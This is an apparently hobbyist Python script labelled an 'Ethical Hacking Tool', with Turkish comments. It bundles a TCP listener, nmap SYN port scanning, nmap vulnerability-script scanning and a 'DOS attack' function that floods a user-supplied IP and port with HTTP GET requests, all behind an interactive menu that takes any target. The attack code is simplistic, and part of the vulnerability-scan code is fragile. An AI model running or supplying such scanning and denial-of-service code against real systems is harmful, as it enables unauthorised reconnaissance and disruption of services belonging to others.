import socket
import nmap
import threading

# Ağ dinleme fonksiyonu
def listen(interface, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((interface, port))
        s.listen()
        print(f"Listening for connections on {interface}:{port}...")
        conn, addr = s.accept()
        with conn:
            print(f"Connected to {addr}")
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                print("Received:", data.decode())

# Port tarama fonksiyonu
def port_scan(target):
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='-p 1-1024 -sS')
    for host in scanner.all_hosts():
        print(f"Host: {host}")
        for proto in scanner[host].all_protocols():
            print(f"Protocol: {proto}")
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                print(f"Port: {port}, State: {state}")

# Zafiyet tarama fonksiyonu
def vulnerability_scan(target):
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='--script vuln')
    for host in scanner.all_hosts():
        print(f"Host: {host}")
        for result in scanner[host]['tcp'].items():
            port = result[0]
            script_results = result[1]['script']
            if script_results:
                print(f"Port: {port}")
                for script, output in script_results.items():
                    print(f"\t{script}: {output}")

# DOS saldırısı fonksiyonu
def dos_attack(target_ip, target_port, num_requests=1000):
    try:
        # Hedef IP adresine soket bağlantısı oluştur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # Belirtilen sayıda HTTP GET isteği gönder
        for _ in range(num_requests):
            s.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")

        # Soketi kapat
        s.close()
        print("DOS attack completed.")
    except Exception as e:
        print("Error during DOS attack:", e)

def main():
    print("""

                 [-] Ethical Hacking Tool [-]
                 
                 [-] AUTH --> ENESALPAY
    
                 [-] DATE --> 07 / 05 / 2024   
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE DOS!    |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  C:\>_          |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"     
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'
""")


    print("\n[-] Welcome to Ethical Hacker Tool!")
    print("\n[-] Please select an option:")
    print("\n[-] 1. Listen for connections")
    print("\n[-] 2. Scan ports")
    print("\n[-] 3. Scan vulnerabilities")
    print("\n[-] 4. Perform DOS attack")
    choice = input("\n[-] Enter your choice (1/2/3/4): ")

    if choice == "1":
        interface = input("Enter interface (e.g., 0.0.0.0): ")
        port = int(input("Enter port: "))
        listen(interface, port)
    elif choice == "2":
        target = input("Enter target IP address or hostname: ")
        port_scan(target)
    elif choice == "3":
        target = input("Enter target IP address or hostname: ")
        vulnerability_scan(target)
    elif choice == "4":
        target_ip = input("Enter target IP address: ")
        target_port = int(input("Enter target port: "))
        dos_attack(target_ip, target_port)
    else:
        print("Invalid choice!")

if __name__ == "__main__":
    main()

